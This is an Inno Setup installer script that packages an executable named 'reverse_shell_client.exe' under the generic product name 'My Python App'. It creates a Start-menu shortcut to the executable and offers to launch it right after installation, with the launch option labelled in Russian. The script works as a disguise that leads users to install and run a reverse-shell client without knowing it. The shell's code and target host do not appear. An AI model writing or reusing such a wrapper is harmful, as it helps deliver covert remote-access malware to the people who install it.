[Setup]
AppName=My Python App
AppVersion=1.0
DefaultDirName={pf}\MyPythonApp
DefaultGroupName=MyPythonApp
OutputDir=output
OutputBaseFilename=MyPythonAppInstaller

[Files]
Source: "dist\reverse_shell_client.exe"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{group}\My Python App"; Filename: "{app}\reverse_shell_client.exe"

[Run]
Filename: "{app}\reverse_shell_client.exe"; Description: "Запустить программу"; Flags: nowait postinstall skipifsilent